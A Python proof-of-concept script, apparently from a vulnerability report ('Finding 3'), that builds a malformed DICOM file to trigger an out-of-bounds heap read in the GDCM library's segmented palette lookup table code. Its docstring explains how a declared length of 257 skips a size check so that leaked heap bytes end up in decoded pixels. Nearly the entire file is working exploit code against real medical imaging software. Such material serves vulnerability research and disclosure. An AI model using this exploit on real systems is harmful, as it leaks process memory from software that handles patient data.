#!/usr/bin/env python3
"""
Finding 3 PoC generator - OOB heap read in
Source/MediaStorageAndFileFormat/gdcmSegmentedPaletteColorLookupTable.cxx:59-64

  DiscreteSegment(const EntryType* first)
      : Segment<EntryType>(first, first+2+*(first+1)) {}

`*(first+1)` (segment length) is attacker-controlled with no bounds check;
std::copy(first+2, last, ...) then reads OOB heap words.

Trigger: gdcm::ImageReader::Read() on the generated poc.dcm.

Why N=257, not N=256 (IncompleteLUT bypass):
  LookupTable::InitializeLUT sets IncompleteLUT=true iff descriptor length != 256.
    N=256 -> IncompleteLUT=false -> LookupTable.cxx:131-137 checks
             Internal->RGB.size() == 3*256*2; that mismatches the 16-bit
             allocation size, so SetLUT returns early: the OOB read still
             happens in ExpandPalette, but the corrupted data never reaches
             Internal->RGB, so pixels are not leaked.
    N=257 -> IncompleteLUT=true -> that size check is skipped, so the 257
             expanded entries (255 of them OOB heap bytes) are written into
             Internal->RGB and decoded into output pixels.

Segment binary layout (uint16_t LE): [opcode=0][length=K][v0]...[v_{K-1}],
spanning first..first+2+K; a segment with no payload bytes in the file makes
first+2+K point past the allocation.
"""

import struct
import sys
import os

# ---------------------------------------------------------------------------
# Minimal raw-DICOM writer (no pydicom dependency)
# ---------------------------------------------------------------------------

def u16le(v):
    return struct.pack('<H', v & 0xFFFF)

def u32le(v):
    return struct.pack('<I', v & 0xFFFFFFFF)

def tag_bytes(group, element):
    return struct.pack('<HH', group, element)

def explicit_vr_de(group, element, vr, data):
    assert isinstance(data, (bytes, bytearray))
    # Pad to even length
    if len(data) % 2 != 0:
        if vr in ('CS', 'LO', 'LT', 'SH', 'ST', 'UT', 'UC'):
            data = data + b' '
        else:
            data = data + b'\x00'
    tg = tag_bytes(group, element)
    vr_bytes = vr.encode('ascii')
    # Long VRs (OB, OW, OF, SQ, UC, UN, UR, UT) use 4-byte length field
    long_vr = vr in ('OB', 'OW', 'OF', 'SQ', 'UC', 'UN', 'UR', 'UT')
    if long_vr:
        return tg + vr_bytes + b'\x00\x00' + u32le(len(data)) + data
    else:
        return tg + vr_bytes + struct.pack('<H', len(data)) + data

def ui_str(uid):
    b = uid.encode('ascii')
    if len(b) % 2 != 0:
        b += b'\x00'
    return b

def cs_str(s):
    b = s.encode('ascii')
    if len(b) % 2 != 0:
        b += b' '
    return b

def us_value(*values):
    return struct.pack('<' + 'H' * len(values), *values)

# ---------------------------------------------------------------------------
# DICOM UIDs & constants
# ---------------------------------------------------------------------------
TRANSFER_SYNTAX_EXPLICIT_VR_LE  = '1.2.840.10008.1.2.1'
SOP_CLASS_SECONDARY_CAPTURE      = '1.2.840.10008.5.1.4.1.1.7'
SOP_INSTANCE_UID                 = '1.2.3.4.5.6.7.8.9.10.11'
STUDY_INSTANCE_UID               = '1.2.3.4.5.6.7.8.9.10.12'
SERIES_INSTANCE_UID              = '1.2.3.4.5.6.7.8.9.10.13'

# ---------------------------------------------------------------------------
# Build the OOB-triggering segmented palette data
# ---------------------------------------------------------------------------
N = 257          # Total entries declared in descriptor (257 != 256 -> IncompleteLUT=true)
K_REAL = 2       # Entries in-bounds in first segment
K_OOB  = N - K_REAL  # 255 -- length field of second segment points OOB

def build_segmented_lut():
    """
    Segment 1: [opcode=0][K_REAL=2][0xAAAA][0xBBBB] -> 2 in-bounds entries.
    Segment 2: [opcode=0][K_OOB=255] with NO payload bytes in the file ->
      DiscreteSegment computes _last = first+2+255, past the allocation,
      so ExpandPalette copies 255 OOB heap uint16_t values.
    Total palette.size() = 2+255 = 257 = N (matches the LUT descriptor).
    """
    seg1 = struct.pack('<HH', 0x0000, K_REAL)   # opcode=0, length=2
    seg1 += struct.pack('<HH', 0xAAAA, 0xBBBB)   # 2 real values

    # opcode + length word only -- no value bytes follow, so first+2+K_OOB
    # in the DiscreteSegment ctor overruns the allocated buffer.
    seg2 = struct.pack('<HH', 0x0000, K_OOB)    # opcode=0, length=255

    return seg1 + seg2

# ---------------------------------------------------------------------------
# Build the full DICOM file
# ---------------------------------------------------------------------------
def build_dicom(output_path):
    rows    = 4
    cols    = 4
    n_pixels = rows * cols

    # Pixel values: 16-bit indices into the palette (0..N-1)
    # Use index 0 and 1 to exercise the in-bounds entries, and index 2+ to
    # exercise values drawn from the OOB region.
    pixel_indices = [0, 1, 2, 3,
                     4, 5, 6, 7,
                     8, 9, 10, 11,
                     12, 13, 14, 15]
    pixel_data = struct.pack('<' + 'H' * n_pixels, *pixel_indices)

    seg_lut_bytes = build_segmented_lut()

    # -----------------------------------------------------------------------
    # Assemble data elements (must be in ascending tag order)
    # -----------------------------------------------------------------------
    des = bytearray()

    # (0008,0016) SOPClassUID
    des += explicit_vr_de(0x0008, 0x0016, 'UI', ui_str(SOP_CLASS_SECONDARY_CAPTURE))
    # (0008,0018) SOPInstanceUID
    des += explicit_vr_de(0x0008, 0x0018, 'UI', ui_str(SOP_INSTANCE_UID))
    # (0020,000D) StudyInstanceUID
    des += explicit_vr_de(0x0020, 0x000D, 'UI', ui_str(STUDY_INSTANCE_UID))
    # (0020,000E) SeriesInstanceUID
    des += explicit_vr_de(0x0020, 0x000E, 'UI', ui_str(SERIES_INSTANCE_UID))

    # (0028,0002) SamplesPerPixel = 1 (PALETTE COLOR uses 1 sample per pixel)
    des += explicit_vr_de(0x0028, 0x0002, 'US', us_value(1))
    # (0028,0004) PhotometricInterpretation = PALETTE COLOR
    des += explicit_vr_de(0x0028, 0x0004, 'CS', cs_str('PALETTE COLOR'))
    # (0028,0010) Rows
    des += explicit_vr_de(0x0028, 0x0010, 'US', us_value(rows))
    # (0028,0011) Columns
    des += explicit_vr_de(0x0028, 0x0011, 'US', us_value(cols))
    # (0028,0100) BitsAllocated = 16
    des += explicit_vr_de(0x0028, 0x0100, 'US', us_value(16))
    # (0028,0101) BitsStored = 16
    des += explicit_vr_de(0x0028, 0x0101, 'US', us_value(16))
    # (0028,0102) HighBit = 15
    des += explicit_vr_de(0x0028, 0x0102, 'US', us_value(15))
    # (0028,0103) PixelRepresentation = 0 (unsigned)
    des += explicit_vr_de(0x0028, 0x0103, 'US', us_value(0))

    # Palette Color Lookup Table Descriptors: [N, first_stored_pixel, bits]
    # N=257 != 256 -> InitializeLUT sets IncompleteLUT=true -> guard bypassed
    # Tag (0028,1101): Red Palette Color LUT Descriptor
    des += explicit_vr_de(0x0028, 0x1101, 'US', us_value(N, 0, 16))
    # Tag (0028,1102): Green Palette Color LUT Descriptor
    des += explicit_vr_de(0x0028, 0x1102, 'US', us_value(N, 0, 16))
    # Tag (0028,1103): Blue Palette Color LUT Descriptor
    des += explicit_vr_de(0x0028, 0x1103, 'US', us_value(N, 0, 16))

    # Segmented Palette Color LUT Data (OW VR)
    # (0028,1221): Segmented Red Palette Color LUT Data
    des += explicit_vr_de(0x0028, 0x1221, 'OW', seg_lut_bytes)
    # (0028,1222): Segmented Green Palette Color LUT Data
    des += explicit_vr_de(0x0028, 0x1222, 'OW', seg_lut_bytes)
    # (0028,1223): Segmented Blue Palette Color LUT Data
    des += explicit_vr_de(0x0028, 0x1223, 'OW', seg_lut_bytes)

    # (7FE0,0010) PixelData  (OW)
    des += explicit_vr_de(0x7FE0, 0x0010, 'OW', pixel_data)

    # -----------------------------------------------------------------------
    # File Meta Information (Group 0002)
    # -----------------------------------------------------------------------
    meta_elements = bytearray()
    # (0002,0001) FileMetaInformationVersion
    meta_elements += explicit_vr_de(0x0002, 0x0001, 'OB', b'\x00\x01')
    # (0002,0002) MediaStorageSOPClassUID
    meta_elements += explicit_vr_de(0x0002, 0x0002, 'UI', ui_str(SOP_CLASS_SECONDARY_CAPTURE))
    # (0002,0003) MediaStorageSOPInstanceUID
    meta_elements += explicit_vr_de(0x0002, 0x0003, 'UI', ui_str(SOP_INSTANCE_UID))
    # (0002,0010) TransferSyntaxUID
    meta_elements += explicit_vr_de(0x0002, 0x0010, 'UI', ui_str(TRANSFER_SYNTAX_EXPLICIT_VR_LE))
    # (0002,0012) ImplementationClassUID
    des_impl_uid = '1.2.3.4.5.999'
    meta_elements += explicit_vr_de(0x0002, 0x0012, 'UI', ui_str(des_impl_uid))

    # (0002,0000) FileMetaInformationGroupLength -- must be first
    group_len_de = explicit_vr_de(0x0002, 0x0000, 'UL', u32le(len(meta_elements)))
    meta = group_len_de + meta_elements

    # -----------------------------------------------------------------------
    # Compose final file: 128-byte preamble + DICM + meta + dataset
    # -----------------------------------------------------------------------
    preamble = b'\x00' * 128 + b'DICM'
    output = preamble + bytes(meta) + bytes(des)

    os.makedirs(os.path.dirname(os.path.abspath(output_path)), exist_ok=True)
    with open(output_path, 'wb') as f:
        f.write(output)

    print(f"Wrote {len(output)} bytes to {output_path}")
    print(f"Segmented LUT payload: {len(seg_lut_bytes)} bytes "
          f"(segment1 len={K_REAL} in-bounds, segment2 len={K_OOB} OOB)")
    print(f"palette.size() = {K_REAL}+{K_OOB} = {N} = N -> IncompleteLUT=true -> RGB guard bypassed")

    return output_path


if __name__ == '__main__':
    out = sys.argv[1] if len(sys.argv) > 1 else \
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'poc.dcm')
    build_dicom(out)
